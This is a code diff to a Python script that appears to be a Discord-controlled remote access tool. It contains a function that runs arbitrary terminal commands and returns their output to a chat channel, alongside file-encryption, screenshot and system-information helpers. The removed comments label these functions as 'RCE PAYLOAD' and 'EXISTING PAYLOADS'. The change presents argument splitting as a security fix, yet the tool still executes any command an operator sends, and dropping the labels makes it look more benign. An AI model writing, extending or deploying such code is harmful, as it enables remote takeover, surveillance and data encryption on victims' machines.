@@ -7,6 +7,7 @@ import sys
 from mss import mss
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import config
+import shlex
 
 # --- ENCRYPTION HELPER ---
 def encrypt_file(filepath):
@@ -24,43 +25,46 @@ def encrypt_file(filepath):
     except Exception as e:
         return None
 
-# --- NEW: RCE PAYLOAD ---
 def run_terminal_command(command_str):
     """
-    Executes a shell command and returns the output.
+    Executes a terminal command SECURELY (No Shell Injection).
     """
     if not command_str: 
         return "⚠️ Error: You must provide a command. Example: ⚡ whoami"
     
     try:
-        # Run the command
-        # shell=True allows using pipes and system variables
+        # 1. Sanitize: Split string into a safe list
+        # POSIX=False preserves quotes on Windows
+        args = shlex.split(command_str, posix=(platform.system() != "Windows"))
+        
+        # 2. Execute directly (shell=False is the default, but let's be explicit)
+        # capture_output=True grabs what would have been printed to screen
         result = subprocess.run(
-            command_str, 
-            shell=True, 
+            args, 
+            shell=False,        # <--- THE BIG FIX
             capture_output=True, 
             text=True, 
-            timeout=15  # Safety timeout
+            timeout=15
         )
         
-        # Combine StdOut and StdErr
         output = result.stdout + result.stderr
         
         if not output:
             return "✅ Command executed successfully (No text output)."
             
-        # Check Discord Limit (2000 chars). We leave buffer for the code block.
         if len(output) > 1900:
             return f"⚠️ Output too long ({len(output)} chars). Truncated:\n{output[:1900]}..."
             
         return output
 
+    except FileNotFoundError:
+        # This happens if the command (e.g., 'ls') isn't found in the PATH
+        return f"⚠️ Error: Command '{args[0]}' not found."
     except subprocess.TimeoutExpired:
-        return "⚠️ Error: Command timed out (took longer than 15s)."
+        return "⚠️ Error: Command timed out."
     except Exception as e:
         return f"⚠️ Execution Error: {str(e)}"
 
-# --- EXISTING PAYLOADS ---
 def get_system_info(args=None):
     data = f"🖥️ OS: {platform.system()} {platform.release()}\n"
     data += f"👤 Node: {platform.node()}\n"
